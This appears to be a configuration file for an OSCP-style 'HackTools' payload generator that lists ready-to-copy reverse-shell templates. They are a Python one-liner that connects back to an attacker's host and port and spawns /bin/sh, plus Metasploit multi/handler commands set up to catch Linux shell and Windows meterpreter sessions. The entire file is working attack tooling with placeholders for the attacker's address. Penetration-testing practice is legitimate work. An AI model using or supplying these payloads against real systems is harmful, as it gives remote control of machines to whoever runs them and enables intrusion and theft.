meta.title: OSCP HackTools — payload generators
meta.note: Fill LHOST/LPORT/FILE and copy a ready payload. Computed: oscp hacktools encode|decode|hash|obfuscate <text>.

categories.name: Reverse shells
categories.desc: Target connects back (catch: oscp hacktools listener <port>).

items.title: python (short)
items.template: export RHOST="{LHOST}";export RPORT={LPORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

items.title: multi/handler (linux)
items.template: msfconsole -q -x 'use multi/handler;set payload linux/x64/shell_reverse_tcp;set LHOST {LHOST};set LPORT {LPORT};run'

items.title: multi/handler (windows met)
items.template: msfconsole -q -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST {LHOST};set LPORT {LPORT};run'
